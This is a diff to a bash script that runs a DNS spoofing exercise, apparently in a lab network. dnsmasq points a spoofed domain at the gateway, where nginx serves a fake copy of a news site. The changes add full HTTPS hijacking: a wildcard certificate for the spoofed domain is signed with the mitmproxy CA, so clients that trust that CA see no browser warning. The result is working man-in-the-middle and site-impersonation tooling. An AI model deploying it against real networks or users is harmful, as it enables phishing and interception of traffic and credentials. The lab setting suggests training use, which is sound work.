@@ -8,9 +8,18 @@ set -euo pipefail
 # Architecture:
 #   - dnsmasq spoof entry: *.SPOOF_DOMAIN → LAB_GATEWAY (192.168.50.1)
 #   - nginx serves on port 80 — mutually exclusive with lab_webserver
+#   - nginx ALSO serves on port 443 with a cert signed by the mitmproxy CA
+#     when that CA is present (full HTTPS hijack for clients that trust it)
 #   - enable stops lab_webserver first; disable only stops nginx
+#   - cert files persist across disable/enable cycles (reused if present)
 #   - no IP alias or extra iptables rules needed: existing ! -d LAB_GATEWAY
 #     rule already bypasses mitmproxy for traffic to 192.168.50.1
+#
+# Bootstrap order for full HTTPS hijack:
+#   1) sudo ./mitm-control.sh enable   (generates /root/.mitmproxy/mitmproxy-ca.pem)
+#   2) sudo ./dns-spoof.sh enable      (detects the CA, signs *.SPOOF_DOMAIN cert)
+#   If step 1 hasn't been run, dns-spoof still works for HTTP — HTTPS hijack
+#   activates automatically the next time dns-spoof is enabled after the CA exists.
 #
 # Usage:
 #   sudo ./dns-spoof.sh enable    # start the exercise
@@ -25,6 +34,11 @@ DNSMASQ_CONF="/etc/dnsmasq.d/dns_spoof.conf"
 NGINX_CONF="/etc/nginx/sites-available/fake-elmundo"
 NGINX_ENABLED="/etc/nginx/sites-enabled/fake-elmundo"
 WEB_ROOT="/var/www/fake-elmundo"
+
+# HTTPS hijack: cert signed by mitmproxy CA (generated on first enable if CA exists)
+MITMPROXY_CA="/root/.mitmproxy/mitmproxy-ca.pem"
+MITM_CERT="/etc/nginx/ssl/${SPOOF_DOMAIN%%.*}-mitm.crt"
+MITM_KEY="/etc/nginx/ssl/${SPOOF_DOMAIN%%.*}-mitm.key"
 
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
 
@@ -253,7 +267,7 @@ write_assets() {
 </html>
 HTML
 
-  # Self-signed cert for the HTTPS→HTTP redirect server block
+  # Self-signed cert for the HTTPS→HTTP redirect server block (default 443)
   mkdir -p /etc/nginx/ssl
   if [[ ! -f /etc/nginx/ssl/spoof.crt ]]; then
     openssl req -x509 -newkey rsa:2048 -days 825 -nodes \
@@ -261,6 +275,28 @@ HTML
       -out    /etc/nginx/ssl/spoof.crt \
       -subj   "/CN=${LAB_GATEWAY}/O=Lab/C=ES" 2>/dev/null
     chmod 600 /etc/nginx/ssl/spoof.key
+  fi
+
+  # Try to bootstrap a mitmproxy-signed cert for full HTTPS hijack.
+  # Sets hijack_block to a nginx server block when available, empty otherwise.
+  local hijack_block=""
+  if ensure_mitm_cert; then
+    hijack_block=$(cat <<HJK
+
+# === HTTPS hijack: cert signed by mitmproxy CA for ${SPOOF_DOMAIN} ===
+# Clients that trust the mitmproxy CA (installed in Block 2) see no warning here.
+# Without the CA installed, browsers still reject — same UX as the default block.
+server {
+    listen 443 ssl;
+    server_name ${SPOOF_DOMAIN} *.${SPOOF_DOMAIN};
+    ssl_certificate     ${MITM_CERT};
+    ssl_certificate_key ${MITM_KEY};
+    root ${WEB_ROOT};
+    index index.html;
+    location / { try_files \$uri \$uri/ /index.html; }
+}
+HJK
+    )
   fi
 
   cat > "${NGINX_CONF}" <<NGINX
@@ -277,10 +313,62 @@ server {
     ssl_certificate_key /etc/nginx/ssl/spoof.key;
     return 301 http://\$host\$request_uri;
 }
+${hijack_block}
 NGINX
 
   ln -sf "${NGINX_CONF}" "${NGINX_ENABLED}"
   rm -f /etc/nginx/sites-enabled/default
+}
+
+# Generate (or reuse) a cert for *.SPOOF_DOMAIN signed by the mitmproxy CA.
+# Returns 0 if a cert is available afterwards, 1 if the CA isn't present yet.
+ensure_mitm_cert() {
+  if [[ -f "${MITM_CERT}" && -f "${MITM_KEY}" ]]; then
+    return 0
+  fi
+
+  if [[ ! -f "${MITMPROXY_CA}" ]]; then
+    echo -e "${YELLOW}[!]${NC} mitmproxy CA not found at ${MITMPROXY_CA}"
+    echo -e "${YELLOW}[!]${NC} HTTPS hijack disabled. Bootstrap order: 'sudo ./mitm-control.sh enable'"
+    echo -e "${YELLOW}[!]${NC} then 'sudo ./dns-spoof.sh disable && sudo ./dns-spoof.sh enable' to activate."
+    return 1
+  fi
+
+  mkdir -p /etc/nginx/ssl
+  local cnf="/tmp/${SPOOF_DOMAIN}-mitm.cnf"
+  local csr="/tmp/${SPOOF_DOMAIN}-mitm.csr"
+
+  cat > "${cnf}" <<CFG
+[req]
+distinguished_name=dn
+req_extensions=ext
+prompt=no
+[dn]
+CN=*.${SPOOF_DOMAIN}
+O=Lab MITM
+C=ES
+[ext]
+subjectAltName=@alt
+keyUsage=digitalSignature,keyEncipherment
+extendedKeyUsage=serverAuth
+[alt]
+DNS.1=${SPOOF_DOMAIN}
+DNS.2=*.${SPOOF_DOMAIN}
+CFG
+
+  openssl genrsa -out "${MITM_KEY}" 2048 2>/dev/null
+  openssl req -new -key "${MITM_KEY}" -out "${csr}" -config "${cnf}" 2>/dev/null
+  openssl x509 -req -in "${csr}" \
+    -CA "${MITMPROXY_CA}" -CAkey "${MITMPROXY_CA}" -CAcreateserial \
+    -out "${MITM_CERT}" -days 365 -sha256 \
+    -extensions ext -extfile "${cnf}" 2>/dev/null
+
+  chmod 600 "${MITM_KEY}"
+  chmod 644 "${MITM_CERT}"
+  rm -f "${cnf}" "${csr}"
+
+  echo -e "${GREEN}[+]${NC} Generated mitmproxy-signed cert for *.${SPOOF_DOMAIN}"
+  return 0
 }
 
 # ---------------------------------------------------------------------------
@@ -349,6 +437,11 @@ print_status() {
     systemctl is-active --quiet nginx \
       && echo -e "${GREEN}[ON] ${NC} nginx   : serving fake ${SPOOF_DOMAIN} on port 80" \
       || echo -e "${RED}[DOWN]${NC} nginx   : not running — check: systemctl status nginx"
+    if [[ -f "${MITM_CERT}" ]]; then
+      echo -e "${GREEN}[ON] ${NC} https   : *.${SPOOF_DOMAIN} cert signed by mitmproxy CA — full hijack"
+    else
+      echo -e "${YELLOW}[OFF]${NC} https   : no mitmproxy-signed cert — HTTPS shows warning"
+    fi
   else
     echo -e "${YELLOW}[OFF]${NC} No DNS spoof active — ${SPOOF_DOMAIN} resolves normally"
   fi
